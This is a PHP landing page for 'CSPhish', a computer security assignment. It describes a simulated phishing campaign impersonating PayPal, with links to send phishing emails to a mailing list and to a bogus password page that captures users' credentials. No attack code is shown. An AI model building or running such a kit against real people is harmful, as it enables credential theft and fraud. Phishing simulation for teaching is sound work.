<?php	
/**
 *	CSPhish
 *	A Computer Security assignment.
 *
 * 	@author Patrick Reid
 * 	@link http://www.reliqartz.com
 */
?>
<?php require_once("./incl/header.php"); ?>

<section id="in">
	<div class="intro">
		<h1>Welcome to CSPhish</h1>
		<p>
			CSPhish is a simulation of a phishing attack on <em>PayPal.com</em>. An email will be sent to 
			several addresses on a mailing list. This email contains a phishing message trying to capture the recipients attention.
			If the recipient is conviced by the message, he/she is taken to a bogus website which captures the users paypal email and password.
		</p>
	</div>
	<div class="actions">
		<h2>Actions</h2>
		<ul>
			<li>
				<a class="act" href="./www.paypal.com/sendtolist">Send Attack</a>
				<p>
					This will launch a phishing attack on <a href="http://www.paypal.com" target="_blank">PayPal.com</a>. 
					Paypal.com is an online payment platform, a service that enables an individual to pay, send money, and accept payments without revealing financial details.
				</p></li>
			<li>
				<a class="act" href="./www.paypal.com/change_password.php">Visit "Change password" screen</a>
				<p>
					View the bogus "reset password" page.
				</p></li>
		</ul>
	</div>
</section>
	
<?php require_once("./incl/footer.php"); ?>